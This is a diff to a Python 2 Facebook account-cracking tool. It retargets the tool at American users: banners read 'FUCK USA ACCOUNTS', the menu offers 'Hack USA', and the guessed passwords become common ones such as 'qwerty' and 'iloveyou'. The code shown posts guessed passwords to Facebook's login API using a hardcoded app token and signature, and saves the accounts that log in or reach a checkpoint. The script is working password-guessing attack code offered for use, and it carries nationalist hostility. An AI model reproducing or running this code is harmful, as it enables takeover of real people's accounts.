@@ -48,11 +48,11 @@ def jalan(z):
 ##### LOGO #####
 logo = """
  \033[1;98m●▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●●▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
-\033[1;97m╭━━━┳╮╱╭┳━━━┳╮╭━╮╭╮╱╭┳━━━┳━━━╮\033[1;94m▒▒▒▒ ╱▔▔▔▔╲ ▒▒▒ FUCK USA ACCOUNTS 🔥
+\033[1;97m╭━━━┳╮╱╭┳━━━┳╮╭━╮╭╮╱╭┳━━━┳━━━╮\033[1;94m▒▒▒▒  ╱▔▔▔▔╲ ▒▒▒ FUCK USA ACCOUNTS 🔥
 \033[1;97m┃╭━━┫┃╱┃┃╭━╮┃┃┃╭╯┃┃╱┃┃╭━╮┃╭━╮┃\033[1;94m▒▒▒▒▕▕╲┊┊╱▏▏▒▒▒ WE ARE PAKISTANIS 🔥
 \033[1;93m┃╰━━┫┃╱┃┃┃╱╰┫╰╯╯╱┃┃╱┃┃╰━━┫┃╱┃┃\033[1;94m▒▒▒▒▕▕▂╱╲▂▏▏▒▒▒ WE HAVE POWER 🔥
-\033[1;93m┃╭━━┫┃╱┃┃┃╱╭┫╭╮┃╱┃┃╱┃┣━━╮┃╰━╯┃\033[1;94m▒▒▒▒ ╲┊┊┊┊╱ ▒▒▒▒
-\033[1;91m┃┃╱╱┃╰━╯┃╰━╯┃┃┃╰╮┃╰━╯┃╰━╯┃╭━╮┃\033[1;94m▒▒▒▒   ╲▂▂╱▏ ▒▒▒▒
+\033[1;93m┃╭━━┫┃╱┃┃┃╱╭┫╭╮┃╱┃┃╱┃┣━━╮┃╰━╯┃\033[1;94m▒▒▒▒  ╲┊┊┊┊╱ ▒▒▒▒
+\033[1;91m┃┃╱╱┃╰━╯┃╰━╯┃┃┃╰╮┃╰━╯┃╰━╯┃╭━╮┃\033[1;94m▒▒▒▒    ╲▂▂╱▏ ▒▒▒▒
 \033[1;91m╰╯╱╱╰━━━┻━━━┻╯╰━╯╰━━━┻━━━┻╯╱╰╯\033[1;94m▒▒▒╱▔▔┊┊┊┊▔▔╲▒▒▒
 \033[1;98m●▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●●▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
 \033[1;91m╔🔥═══════════════════════════════════════════🔥═🔥═🔥╗
@@ -77,7 +77,7 @@ logo2 = """
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\x1b[1;93m█████████████████▒▒▒▒▒▒▒▒..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\x1b[1;91m█████████████████▒▒▒▒▒▒▒▒..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 
 
 back = 0
@@ -177,9 +177,7 @@ def menu():
 	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Nama \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
 	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
 	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;36m Hack Fb MBF"
-	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;36m Group ki list dekho               "
-	print "\x1b[1;96m[\x1b[1;92m4\x1b[1;96m]\x1b[1;36m Yahoo clone               "
+	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;36m Hack USA"            "
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Logout            "
 	pilih()
 
@@ -217,10 +215,7 @@ def super():
 	os.system('clear')
 	print logo
 	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;36m Apni id ki friend list hack"
-	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;36m Apny dost ki friend list hack"
-	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;36m Apny facebook group ko hack kro"
-	print "\x1b[1;96m[\x1b[1;92m4\x1b[1;96m]\x1b[1;36m list bana k hack kro"
+	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;36m Fuck Usa Accounts"
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Back"
 	pilih_super()
 
@@ -293,7 +288,7 @@ def pilih_super():
 		pilih_super()
 	
 	print "\033[1;96m[+] \033[1;93mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
-	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
+	jalan('\033[1;96m[✺] \033[1;93mAahil Start cloning \033[1;97m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
@@ -368,7 +363,7 @@ def pilih_super():
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
-											pass5 = ('indian')
+											pass5 = ('qwerty')
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -382,7 +377,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = ('indian123')
+													pass6 = ('12qwe')
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -398,7 +393,7 @@ def pilih_super():
 														else:
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
-															pass7 = ('india123')
+															pass7 = ('Amarica')
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
@@ -414,7 +409,7 @@ def pilih_super():
 																else:
 																	a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 																	b = json.loads(a.text)
-																	pass8 = ('bhagwan')
+																	pass8 = ('iloveyou')
 																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																	q = json.load(data)
 																	if 'access_token' in q:
